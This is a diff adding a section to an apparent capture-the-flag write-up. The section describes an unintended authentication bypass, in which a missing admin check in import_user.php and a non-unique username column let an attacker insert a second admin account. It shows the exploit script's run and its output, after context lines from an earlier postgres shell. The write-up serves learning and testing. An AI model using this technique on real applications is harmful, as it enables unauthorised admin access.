@@ -186,3 +186,16 @@ bash: cannot set terminal process group (132): Inappropriate ioctl for device
 bash: no job control in this shell
 postgres@fc7fb3a7332b:~/18/docker$
 ```
+
+#### Authentication Bypass &mdash; Missing Access Control in import_user.php
+
+_Credit to **xpnt0**_
+
+The `admin/import_user.php` endpoint does not contain an `isadmin` check. Furthermore, the `/admin/` directory is reachable without authentication. Because `users.username` has no `UNIQUE` constraint and `login.php` grants admin based on the username string, an attacker can insert a second `admin` row with a password hash of their choosing and then log in as said user.
+
+```console
+$ python3 unintended/importUser.py 'http://localhost:8000'
+[*] Injected admin row with password: TF3et30077E0Z8yUJ273
+[*] Logged in as admin
+[+] Got admin: admin / TF3et30077E0Z8yUJ273 (PHPSESSID=41552069aeb1a6740e335e4e794af031)
+```
